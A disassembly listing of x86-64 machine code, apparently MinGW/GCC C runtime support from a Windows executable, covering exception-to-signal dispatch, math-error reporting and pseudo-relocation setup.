  4046aa:	90                   	nop
  4046ab:	90                   	nop
  4046ac:	90                   	nop
  4046ad:	90                   	nop
  4046ae:	90                   	nop
  4046af:	90                   	nop
  4046b0:	53                   	push   %rbx
  4046b1:	48 83 ec 30          	sub    $0x30,%rsp
  4046b5:	48 89 cb             	mov    %rcx,%rbx
  4046b8:	48 8b 0d 21 ce 15 00 	mov    0x15ce21(%rip),%rcx        # 0x5614e0
  4046bf:	e8 cc ff ff ff       	call   0x404690
  4046c4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  4046c8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  4046cd:	74 76                	je     0x404745
  4046cf:	b9 08 00 00 00       	mov    $0x8,%ecx
  4046d4:	e8 9f 62 00 00       	call   0x40a978
  4046d9:	48 8b 0d 00 ce 15 00 	mov    0x15ce00(%rip),%rcx        # 0x5614e0
  4046e0:	e8 ab ff ff ff       	call   0x404690
  4046e5:	48 8b 0d fc cd 15 00 	mov    0x15cdfc(%rip),%rcx        # 0x5614e8
  4046ec:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  4046f1:	e8 9a ff ff ff       	call   0x404690
  4046f6:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
  4046fb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  404700:	48 89 d9             	mov    %rbx,%rcx
  404703:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  404708:	e8 73 62 00 00       	call   0x40a980
  40470d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  404712:	48 89 c3             	mov    %rax,%rbx
  404715:	e8 86 ff ff ff       	call   0x4046a0
  40471a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  40471f:	48 89 05 ba cd 15 00 	mov    %rax,0x15cdba(%rip)        # 0x5614e0
  404726:	e8 75 ff ff ff       	call   0x4046a0
  40472b:	b9 08 00 00 00       	mov    $0x8,%ecx
  404730:	48 89 05 b1 cd 15 00 	mov    %rax,0x15cdb1(%rip)        # 0x5614e8
  404737:	e8 4c 62 00 00       	call   0x40a988
  40473c:	48 89 d8             	mov    %rbx,%rax
  40473f:	48 83 c4 30          	add    $0x30,%rsp
  404743:	5b                   	pop    %rbx
  404744:	c3                   	ret
  404745:	48 89 d9             	mov    %rbx,%rcx
  404748:	ff 15 a6 df 15 00    	call   *0x15dfa6(%rip)        # 0x5626f4
  40474e:	48 89 c3             	mov    %rax,%rbx
  404751:	48 89 d8             	mov    %rbx,%rax
  404754:	48 83 c4 30          	add    $0x30,%rsp
  404758:	5b                   	pop    %rbx
  404759:	c3                   	ret
  40475a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  404760:	48 83 ec 28          	sub    $0x28,%rsp
  404764:	e8 47 ff ff ff       	call   0x4046b0
  404769:	48 83 f8 01          	cmp    $0x1,%rax
  40476d:	19 c0                	sbb    %eax,%eax
  40476f:	48 83 c4 28          	add    $0x28,%rsp
  404773:	c3                   	ret
  404774:	90                   	nop
  404775:	90                   	nop
  404776:	90                   	nop
  404777:	90                   	nop
  404778:	90                   	nop
  404779:	90                   	nop
  40477a:	90                   	nop
  40477b:	90                   	nop
  40477c:	90                   	nop
  40477d:	90                   	nop
  40477e:	90                   	nop
  40477f:	90                   	nop
  404780:	53                   	push   %rbx
  404781:	48 83 ec 30          	sub    $0x30,%rsp
  404785:	8b 01                	mov    (%rcx),%eax
  404787:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  40478c:	77 42                	ja     0x4047d0
  40478e:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  404793:	72 6b                	jb     0x404800
  404795:	bb 01 00 00 00       	mov    $0x1,%ebx
  40479a:	31 d2                	xor    %edx,%edx
  40479c:	b9 08 00 00 00       	mov    $0x8,%ecx
  4047a1:	e8 ea 61 00 00       	call   0x40a990
  4047a6:	48 83 f8 01          	cmp    $0x1,%rax
  4047aa:	48 89 c2             	mov    %rax,%rdx
  4047ad:	0f 84 1d 01 00 00    	je     0x4048d0
  4047b3:	48 85 d2             	test   %rdx,%rdx
  4047b6:	b8 01 00 00 00       	mov    $0x1,%eax
  4047bb:	74 09                	je     0x4047c6
  4047bd:	b9 08 00 00 00       	mov    $0x8,%ecx
  4047c2:	ff d2                	call   *%rdx
  4047c4:	31 c0                	xor    %eax,%eax
  4047c6:	48 83 c4 30          	add    $0x30,%rsp
  4047ca:	5b                   	pop    %rbx
  4047cb:	c3                   	ret
  4047cc:	0f 1f 40 00          	nopl   0x0(%rax)
  4047d0:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  4047d5:	0f 84 b5 00 00 00    	je     0x404890
  4047db:	77 73                	ja     0x404850
  4047dd:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  4047e2:	0f 84 ca 00 00 00    	je     0x4048b2
  4047e8:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  4047ed:	74 a6                	je     0x404795
  4047ef:	b8 01 00 00 00       	mov    $0x1,%eax
  4047f4:	48 83 c4 30          	add    $0x30,%rsp
  4047f8:	5b                   	pop    %rbx
  4047f9:	c3                   	ret
  4047fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  404800:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  404805:	0f 84 a7 00 00 00    	je     0x4048b2
  40480b:	0f 87 8f 00 00 00    	ja     0x4048a0
  404811:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  404816:	0f 84 96 00 00 00    	je     0x4048b2
  40481c:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  404821:	75 cc                	jne    0x4047ef
  404823:	31 d2                	xor    %edx,%edx
  404825:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40482a:	e8 61 61 00 00       	call   0x40a990
  40482f:	48 83 f8 01          	cmp    $0x1,%rax
  404833:	0f 84 bd 00 00 00    	je     0x4048f6
  404839:	48 85 c0             	test   %rax,%rax
  40483c:	0f 84 7e 00 00 00    	je     0x4048c0
  404842:	b9 0b 00 00 00       	mov    $0xb,%ecx
  404847:	ff d0                	call   *%rax
  404849:	31 c0                	xor    %eax,%eax
  40484b:	e9 76 ff ff ff       	jmp    0x4047c6
  404850:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  404855:	74 5b                	je     0x4048b2
  404857:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  40485c:	75 91                	jne    0x4047ef
  40485e:	31 d2                	xor    %edx,%edx
  404860:	b9 04 00 00 00       	mov    $0x4,%ecx
  404865:	e8 26 61 00 00       	call   0x40a990
  40486a:	48 83 f8 01          	cmp    $0x1,%rax
  40486e:	0f 84 98 00 00 00    	je     0x40490c
  404874:	48 85 c0             	test   %rax,%rax
  404877:	74 47                	je     0x4048c0
  404879:	b9 04 00 00 00       	mov    $0x4,%ecx
  40487e:	ff d0                	call   *%rax
  404880:	31 c0                	xor    %eax,%eax
  404882:	e9 3f ff ff ff       	jmp    0x4047c6
  404887:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40488e:	00 00 
  404890:	31 db                	xor    %ebx,%ebx
  404892:	e9 03 ff ff ff       	jmp    0x40479a
  404897:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40489e:	00 00 
  4048a0:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  4048a5:	74 b7                	je     0x40485e
  4048a7:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  4048ac:	0f 85 3d ff ff ff    	jne    0x4047ef
  4048b2:	31 c0                	xor    %eax,%eax
  4048b4:	48 83 c4 30          	add    $0x30,%rsp
  4048b8:	5b                   	pop    %rbx
  4048b9:	c3                   	ret
  4048ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4048c0:	b8 04 00 00 00       	mov    $0x4,%eax
  4048c5:	48 83 c4 30          	add    $0x30,%rsp
  4048c9:	5b                   	pop    %rbx
  4048ca:	c3                   	ret
  4048cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4048d0:	b9 08 00 00 00       	mov    $0x8,%ecx
  4048d5:	e8 b6 60 00 00       	call   0x40a990
  4048da:	31 c0                	xor    %eax,%eax
  4048dc:	85 db                	test   %ebx,%ebx
  4048de:	0f 84 e2 fe ff ff    	je     0x4047c6
  4048e4:	89 44 24 28          	mov    %eax,0x28(%rsp)
  4048e8:	e8 b3 0d 00 00       	call   0x4056a0
  4048ed:	8b 44 24 28          	mov    0x28(%rsp),%eax
  4048f1:	e9 d0 fe ff ff       	jmp    0x4047c6
  4048f6:	ba 01 00 00 00       	mov    $0x1,%edx
  4048fb:	b9 0b 00 00 00       	mov    $0xb,%ecx
  404900:	e8 8b 60 00 00       	call   0x40a990
  404905:	31 c0                	xor    %eax,%eax
  404907:	e9 ba fe ff ff       	jmp    0x4047c6
  40490c:	ba 01 00 00 00       	mov    $0x1,%edx
  404911:	b9 04 00 00 00       	mov    $0x4,%ecx
  404916:	e8 75 60 00 00       	call   0x40a990
  40491b:	31 c0                	xor    %eax,%eax
  40491d:	e9 a4 fe ff ff       	jmp    0x4047c6
  404922:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  404929:	1f 84 00 00 00 00 00 
  404930:	41 54                	push   %r12
  404932:	55                   	push   %rbp
  404933:	57                   	push   %rdi
  404934:	56                   	push   %rsi
  404935:	53                   	push   %rbx
  404936:	48 83 ec 20          	sub    $0x20,%rsp
  40493a:	e8 91 0b 00 00       	call   0x4054d0
  40493f:	48 89 c5             	mov    %rax,%rbp
  404942:	8b 05 80 b8 15 00    	mov    0x15b880(%rip),%eax        # 0x5601c8
  404948:	85 c0                	test   %eax,%eax
  40494a:	75 25                	jne    0x404971
  40494c:	48 85 ed             	test   %rbp,%rbp
  40494f:	74 20                	je     0x404971
  404951:	48 8d 0d 88 8c 15 00 	lea    0x158c88(%rip),%rcx        # 0x55d5e0
  404958:	c7 05 66 b8 15 00 01 	movl   $0x1,0x15b866(%rip)        # 0x5601c8
  40495f:	00 00 00 
  404962:	e8 f9 09 00 00       	call   0x405360
  404967:	48 85 c0             	test   %rax,%rax
  40496a:	74 14                	je     0x404980
  40496c:	b8 01 00 00 00       	mov    $0x1,%eax
  404971:	48 83 c4 20          	add    $0x20,%rsp
  404975:	5b                   	pop    %rbx
  404976:	5e                   	pop    %rsi
  404977:	5f                   	pop    %rdi
  404978:	5d                   	pop    %rbp
  404979:	41 5c                	pop    %r12
  40497b:	c3                   	ret
  40497c:	0f 1f 40 00          	nopl   0x0(%rax)
  404980:	48 8d 35 59 b8 15 00 	lea    0x15b859(%rip),%rsi        # 0x5601e0
  404987:	b9 30 00 00 00       	mov    $0x30,%ecx
  40498c:	4c 8d 25 cd b9 15 00 	lea    0x15b9cd(%rip),%r12        # 0x560360
  404993:	31 db                	xor    %ebx,%ebx
  404995:	48 89 f7             	mov    %rsi,%rdi
  404998:	f3 48 ab             	rep stos %rax,(%rdi)
  40499b:	4c 89 e7             	mov    %r12,%rdi
  40499e:	b1 20                	mov    $0x20,%cl
  4049a0:	f3 48 ab             	rep stos %rax,(%rdi)
  4049a3:	48 8d 3d d6 fd ff ff 	lea    -0x22a(%rip),%rdi        # 0x404780
  4049aa:	48 29 ef             	sub    %rbp,%rdi
  4049ad:	eb 33                	jmp    0x4049e2
  4049af:	90                   	nop
  4049b0:	48 8d 05 ad b9 15 00 	lea    0x15b9ad(%rip),%rax        # 0x560364
  4049b7:	41 c6 04 dc 09       	movb   $0x9,(%r12,%rbx,8)
  4049bc:	89 3c d8             	mov    %edi,(%rax,%rbx,8)
  4049bf:	8b 42 0c             	mov    0xc(%rdx),%eax
  4049c2:	89 06                	mov    %eax,(%rsi)
  4049c4:	03 42 08             	add    0x8(%rdx),%eax
  4049c7:	49 8d 14 dc          	lea    (%r12,%rbx,8),%rdx
  4049cb:	48 83 c3 01          	add    $0x1,%rbx
  4049cf:	48 29 ea             	sub    %rbp,%rdx
  4049d2:	89 56 08             	mov    %edx,0x8(%rsi)
  4049d5:	89 46 04             	mov    %eax,0x4(%rsi)
  4049d8:	48 83 c6 0c          	add    $0xc,%rsi
  4049dc:	48 83 fb 20          	cmp    $0x20,%rbx
  4049e0:	74 33                	je     0x404a15
  4049e2:	48 89 d9             	mov    %rbx,%rcx
  4049e5:	e8 76 0a 00 00       	call   0x405460
  4049ea:	48 85 c0             	test   %rax,%rax
  4049ed:	48 89 c2             	mov    %rax,%rdx
  4049f0:	75 be                	jne    0x4049b0
  4049f2:	48 85 db             	test   %rbx,%rbx
  4049f5:	0f 84 71 ff ff ff    	je     0x40496c
  4049fb:	89 da                	mov    %ebx,%edx
  4049fd:	0f 1f 00             	nopl   (%rax)
  404a00:	49 89 e8             	mov    %rbp,%r8
  404a03:	48 8d 0d d6 b7 15 00 	lea    0x15b7d6(%rip),%rcx        # 0x5601e0
  404a0a:	ff 15 fc db 15 00    	call   *0x15dbfc(%rip)        # 0x56260c
  404a10:	e9 57 ff ff ff       	jmp    0x40496c
  404a15:	ba 20 00 00 00       	mov    $0x20,%edx
  404a1a:	eb e4                	jmp    0x404a00
  404a1c:	0f 1f 40 00          	nopl   0x0(%rax)
  404a20:	56                   	push   %rsi
  404a21:	53                   	push   %rbx
  404a22:	48 83 ec 28          	sub    $0x28,%rsp
  404a26:	48 8b 11             	mov    (%rcx),%rdx
  404a29:	48 89 cb             	mov    %rcx,%rbx
  404a2c:	8b 02                	mov    (%rdx),%eax
  404a2e:	89 c1                	mov    %eax,%ecx
  404a30:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
  404a36:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
  404a3c:	0f 84 8e 00 00 00    	je     0x404ad0
  404a42:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  404a47:	76 47                	jbe    0x404a90
  404a49:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  404a4e:	0f 84 2c 01 00 00    	je     0x404b80
  404a54:	0f 86 d6 00 00 00    	jbe    0x404b30
  404a5a:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  404a5f:	74 5d                	je     0x404abe
  404a61:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  404a66:	0f 84 e4 00 00 00    	je     0x404b50
  404a6c:	0f 1f 40 00          	nopl   0x0(%rax)
  404a70:	48 8b 05 49 b7 15 00 	mov    0x15b749(%rip),%rax        # 0x5601c0
  404a77:	48 85 c0             	test   %rax,%rax
  404a7a:	74 47                	je     0x404ac3
  404a7c:	48 89 d9             	mov    %rbx,%rcx
  404a7f:	48 83 c4 28          	add    $0x28,%rsp
  404a83:	5b                   	pop    %rbx
  404a84:	5e                   	pop    %rsi
  404a85:	48 ff e0             	rex.W jmp *%rax
  404a88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  404a8f:	00 
  404a90:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  404a95:	72 49                	jb     0x404ae0
  404a97:	be 01 00 00 00       	mov    $0x1,%esi
  404a9c:	31 d2                	xor    %edx,%edx
  404a9e:	b9 08 00 00 00       	mov    $0x8,%ecx
  404aa3:	e8 e8 5e 00 00       	call   0x40a990
  404aa8:	48 83 f8 01          	cmp    $0x1,%rax
  404aac:	0f 84 fe 00 00 00    	je     0x404bb0
  404ab2:	48 85 c0             	test   %rax,%rax
  404ab5:	74 b9                	je     0x404a70
  404ab7:	b9 08 00 00 00       	mov    $0x8,%ecx
  404abc:	ff d0                	call   *%rax
  404abe:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404ac3:	48 83 c4 28          	add    $0x28,%rsp
  404ac7:	5b                   	pop    %rbx
  404ac8:	5e                   	pop    %rsi
  404ac9:	c3                   	ret
  404aca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  404ad0:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
  404ad4:	0f 85 68 ff ff ff    	jne    0x404a42
  404ada:	eb e2                	jmp    0x404abe
  404adc:	0f 1f 40 00          	nopl   0x0(%rax)
  404ae0:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  404ae5:	74 d7                	je     0x404abe
  404ae7:	0f 87 a3 00 00 00    	ja     0x404b90
  404aed:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  404af2:	74 ca                	je     0x404abe
  404af4:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  404af9:	0f 85 71 ff ff ff    	jne    0x404a70
  404aff:	31 d2                	xor    %edx,%edx
  404b01:	b9 0b 00 00 00       	mov    $0xb,%ecx
  404b06:	e8 85 5e 00 00       	call   0x40a990
  404b0b:	48 83 f8 01          	cmp    $0x1,%rax
  404b0f:	0f 84 c0 00 00 00    	je     0x404bd5
  404b15:	48 85 c0             	test   %rax,%rax
  404b18:	0f 84 52 ff ff ff    	je     0x404a70
  404b1e:	b9 0b 00 00 00       	mov    $0xb,%ecx
  404b23:	ff d0                	call   *%rax
  404b25:	eb 97                	jmp    0x404abe
  404b27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  404b2e:	00 00 
  404b30:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  404b35:	74 87                	je     0x404abe
  404b37:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  404b3c:	0f 85 2e ff ff ff    	jne    0x404a70
  404b42:	e9 50 ff ff ff       	jmp    0x404a97
  404b47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  404b4e:	00 00 
  404b50:	31 d2                	xor    %edx,%edx
  404b52:	b9 04 00 00 00       	mov    $0x4,%ecx
  404b57:	e8 34 5e 00 00       	call   0x40a990
  404b5c:	48 83 f8 01          	cmp    $0x1,%rax
  404b60:	0f 84 83 00 00 00    	je     0x404be9
  404b66:	48 85 c0             	test   %rax,%rax
  404b69:	0f 84 01 ff ff ff    	je     0x404a70
  404b6f:	b9 04 00 00 00       	mov    $0x4,%ecx
  404b74:	ff d0                	call   *%rax
  404b76:	e9 43 ff ff ff       	jmp    0x404abe
  404b7b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404b80:	31 f6                	xor    %esi,%esi
  404b82:	e9 15 ff ff ff       	jmp    0x404a9c
  404b87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  404b8e:	00 00 
  404b90:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  404b95:	74 b9                	je     0x404b50
  404b97:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  404b9c:	0f 85 ce fe ff ff    	jne    0x404a70
  404ba2:	e9 17 ff ff ff       	jmp    0x404abe
  404ba7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  404bae:	00 00 
  404bb0:	ba 01 00 00 00       	mov    $0x1,%edx
  404bb5:	b9 08 00 00 00       	mov    $0x8,%ecx
  404bba:	e8 d1 5d 00 00       	call   0x40a990
  404bbf:	85 f6                	test   %esi,%esi
  404bc1:	0f 84 f7 fe ff ff    	je     0x404abe
  404bc7:	e8 d4 0a 00 00       	call   0x4056a0
  404bcc:	0f 1f 40 00          	nopl   0x0(%rax)
  404bd0:	e9 e9 fe ff ff       	jmp    0x404abe
  404bd5:	ba 01 00 00 00       	mov    $0x1,%edx
  404bda:	b9 0b 00 00 00       	mov    $0xb,%ecx
  404bdf:	e8 ac 5d 00 00       	call   0x40a990
  404be4:	e9 d5 fe ff ff       	jmp    0x404abe
  404be9:	ba 01 00 00 00       	mov    $0x1,%edx
  404bee:	b9 04 00 00 00       	mov    $0x4,%ecx
  404bf3:	e8 98 5d 00 00       	call   0x40a990
  404bf8:	e9 c1 fe ff ff       	jmp    0x404abe
  404bfd:	90                   	nop
  404bfe:	90                   	nop
  404bff:	90                   	nop
  404c00:	48 83 ec 58          	sub    $0x58,%rsp
  404c04:	48 8b 05 55 b8 15 00 	mov    0x15b855(%rip),%rax        # 0x560460
  404c0b:	48 85 c0             	test   %rax,%rax
  404c0e:	74 2c                	je     0x404c3c
  404c10:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
  404c17:	00 00 
  404c19:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  404c1d:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  404c22:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
  404c28:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  404c2d:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
  404c33:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
  404c39:	ff d0                	call   *%rax
  404c3b:	90                   	nop
  404c3c:	48 83 c4 58          	add    $0x58,%rsp
  404c40:	c3                   	ret
  404c41:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  404c48:	0f 1f 84 00 00 00 00 
  404c4f:	00 
  404c50:	48 89 0d 09 b8 15 00 	mov    %rcx,0x15b809(%rip)        # 0x560460
  404c57:	e9 3c 5d 00 00       	jmp    0x40a998
  404c5c:	0f 1f 40 00          	nopl   0x0(%rax)
  404c60:	56                   	push   %rsi
  404c61:	53                   	push   %rbx
  404c62:	48 83 ec 78          	sub    $0x78,%rsp
  404c66:	0f 29 74 24 40       	movaps %xmm6,0x40(%rsp)
  404c6b:	0f 29 7c 24 50       	movaps %xmm7,0x50(%rsp)
  404c70:	44 0f 29 44 24 60    	movaps %xmm8,0x60(%rsp)
  404c76:	83 39 06             	cmpl   $0x6,(%rcx)
  404c79:	76 65                	jbe    0x404ce0
  404c7b:	48 8d 35 54 8a 15 00 	lea    0x158a54(%rip),%rsi        # 0x55d6d6
  404c82:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
  404c88:	48 8b 59 08          	mov    0x8(%rcx),%rbx
  404c8c:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
  404c91:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
  404c96:	e8 05 5d 00 00       	call   0x40a9a0
  404c9b:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
  404ca2:	48 8d 48 60          	lea    0x60(%rax),%rcx
  404ca6:	48 8d 15 3b 8a 15 00 	lea    0x158a3b(%rip),%rdx        # 0x55d6e8
  404cad:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
  404cb3:	49 89 d9             	mov    %rbx,%r9
  404cb6:	49 89 f0             	mov    %rsi,%r8
  404cb9:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
  404cbf:	e8 0c 11 00 00       	call   0x405dd0
  404cc4:	90                   	nop
  404cc5:	0f 28 74 24 40       	movaps 0x40(%rsp),%xmm6
  404cca:	31 c0                	xor    %eax,%eax
  404ccc:	0f 28 7c 24 50       	movaps 0x50(%rsp),%xmm7
  404cd1:	44 0f 28 44 24 60    	movaps 0x60(%rsp),%xmm8
  404cd7:	48 83 c4 78          	add    $0x78,%rsp
  404cdb:	5b                   	pop    %rbx
  404cdc:	5e                   	pop    %rsi
  404cdd:	c3                   	ret
  404cde:	66 90                	xchg   %ax,%ax
  404ce0:	8b 11                	mov    (%rcx),%edx
  404ce2:	48 8d 05 2b 8a 15 00 	lea    0x158a2b(%rip),%rax        # 0x55d714
  404ce9:	48 63 14 90          	movslq (%rax,%rdx,4),%rdx
  404ced:	48 01 d0             	add    %rdx,%rax
  404cf0:	ff e0                	jmp    *%rax
  404cf2:	48 8d 35 57 89 15 00 	lea    0x158957(%rip),%rsi        # 0x55d650
  404cf9:	eb 87                	jmp    0x404c82
  404cfb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404d00:	48 8d 35 e9 88 15 00 	lea    0x1588e9(%rip),%rsi        # 0x55d5f0
  404d07:	e9 76 ff ff ff       	jmp    0x404c82
  404d0c:	0f 1f 40 00          	nopl   0x0(%rax)
  404d10:	48 8d 35 f8 88 15 00 	lea    0x1588f8(%rip),%rsi        # 0x55d60f
  404d17:	e9 66 ff ff ff       	jmp    0x404c82
  404d1c:	0f 1f 40 00          	nopl   0x0(%rax)
  404d20:	48 8d 35 09 89 15 00 	lea    0x158909(%rip),%rsi        # 0x55d630
  404d27:	e9 56 ff ff ff       	jmp    0x404c82
  404d2c:	0f 1f 40 00          	nopl   0x0(%rax)
  404d30:	48 8d 35 69 89 15 00 	lea    0x158969(%rip),%rsi        # 0x55d6a0
  404d37:	e9 46 ff ff ff       	jmp    0x404c82
  404d3c:	0f 1f 40 00          	nopl   0x0(%rax)
  404d40:	48 8d 35 31 89 15 00 	lea    0x158931(%rip),%rsi        # 0x55d678
  404d47:	e9 36 ff ff ff       	jmp    0x404c82
  404d4c:	90                   	nop
  404d4d:	90                   	nop
  404d4e:	90                   	nop
  404d4f:	90                   	nop
  404d50:	31 c0                	xor    %eax,%eax
  404d52:	c3                   	ret
  404d53:	90                   	nop
  404d54:	90                   	nop
  404d55:	90                   	nop
  404d56:	90                   	nop
  404d57:	90                   	nop
  404d58:	90                   	nop
  404d59:	90                   	nop
  404d5a:	90                   	nop
  404d5b:	90                   	nop
  404d5c:	90                   	nop
  404d5d:	90                   	nop
  404d5e:	90                   	nop
  404d5f:	90                   	nop
  404d60:	56                   	push   %rsi
  404d61:	53                   	push   %rbx
  404d62:	48 83 ec 38          	sub    $0x38,%rsp
  404d66:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  404d6b:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  404d70:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  404d75:	48 89 cb             	mov    %rcx,%rbx
  404d78:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
  404d7d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  404d82:	e8 19 5c 00 00       	call   0x40a9a0
  404d87:	48 8d 15 a2 89 15 00 	lea    0x1589a2(%rip),%rdx        # 0x55d730
  404d8e:	48 8d 48 60          	lea    0x60(%rax),%rcx
  404d92:	e8 39 10 00 00       	call   0x405dd0
  404d97:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
  404d9c:	e8 ff 5b 00 00       	call   0x40a9a0
  404da1:	48 8d 48 60          	lea    0x60(%rax),%rcx
  404da5:	48 89 da             	mov    %rbx,%rdx
  404da8:	49 89 f0             	mov    %rsi,%r8
  404dab:	e8 60 10 00 00       	call   0x405e10
  404db0:	e8 f3 5b 00 00       	call   0x40a9a8
  404db5:	90                   	nop
  404db6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  404dbd:	00 00 00 
  404dc0:	41 56                	push   %r14
  404dc2:	41 55                	push   %r13
  404dc4:	41 54                	push   %r12
  404dc6:	55                   	push   %rbp
  404dc7:	57                   	push   %rdi
  404dc8:	56                   	push   %rsi
  404dc9:	53                   	push   %rbx
  404dca:	48 83 ec 60          	sub    $0x60,%rsp
  404dce:	48 89 ce             	mov    %rcx,%rsi
  404dd1:	8b 0d a9 b6 15 00    	mov    0x15b6a9(%rip),%ecx        # 0x560480
  404dd7:	48 89 d7             	mov    %rdx,%rdi
  404dda:	4c 89 c5             	mov    %r8,%rbp
  404ddd:	85 c9                	test   %ecx,%ecx
  404ddf:	0f 8e bb 01 00 00    	jle    0x404fa0
  404de5:	48 8b 05 8c b6 15 00 	mov    0x15b68c(%rip),%rax        # 0x560478
  404dec:	31 db                	xor    %ebx,%ebx
  404dee:	66 90                	xchg   %ax,%ax
  404df0:	4c 8b 48 08          	mov    0x8(%rax),%r9
  404df4:	4c 39 ce             	cmp    %r9,%rsi
  404df7:	72 13                	jb     0x404e0c
  404df9:	48 8b 50 10          	mov    0x10(%rax),%rdx
  404dfd:	8b 52 08             	mov    0x8(%rdx),%edx
  404e00:	49 01 d1             	add    %rdx,%r9
  404e03:	4c 39 ce             	cmp    %r9,%rsi
  404e06:	0f 82 d4 00 00 00    	jb     0x404ee0
  404e0c:	83 c3 01             	add    $0x1,%ebx
  404e0f:	48 83 c0 18          	add    $0x18,%rax
  404e13:	39 cb                	cmp    %ecx,%ebx
  404e15:	75 d9                	jne    0x404df0
  404e17:	48 89 f1             	mov    %rsi,%rcx
  404e1a:	e8 d1 05 00 00       	call   0x4053f0
  404e1f:	48 85 c0             	test   %rax,%rax
  404e22:	49 89 c4             	mov    %rax,%r12
  404e25:	0f 84 99 01 00 00    	je     0x404fc4
  404e2b:	48 63 db             	movslq %ebx,%rbx
  404e2e:	4c 8d 6c 24 30       	lea    0x30(%rsp),%r13
  404e33:	4c 8d 34 5b          	lea    (%rbx,%rbx,2),%r14
  404e37:	48 8b 1d 3a b6 15 00 	mov    0x15b63a(%rip),%rbx        # 0x560478
  404e3e:	49 c1 e6 03          	shl    $0x3,%r14
  404e42:	4c 01 f3             	add    %r14,%rbx
  404e45:	48 89 43 10          	mov    %rax,0x10(%rbx)
  404e49:	c7 03 00 00 00 00    	movl   $0x0,(%rbx)
  404e4f:	e8 7c 06 00 00       	call   0x4054d0
  404e54:	41 8b 54 24 0c       	mov    0xc(%r12),%edx
  404e59:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  404e5f:	48 01 d0             	add    %rdx,%rax
  404e62:	4c 89 ea             	mov    %r13,%rdx
  404e65:	48 89 43 08          	mov    %rax,0x8(%rbx)
  404e69:	48 8b 05 08 b6 15 00 	mov    0x15b608(%rip),%rax        # 0x560478
  404e70:	48 8b 1d e5 d7 15 00 	mov    0x15d7e5(%rip),%rbx        # 0x56265c
  404e77:	4a 8b 4c 30 08       	mov    0x8(%rax,%r14,1),%rcx
  404e7c:	ff d3                	call   *%rbx
  404e7e:	48 85 c0             	test   %rax,%rax
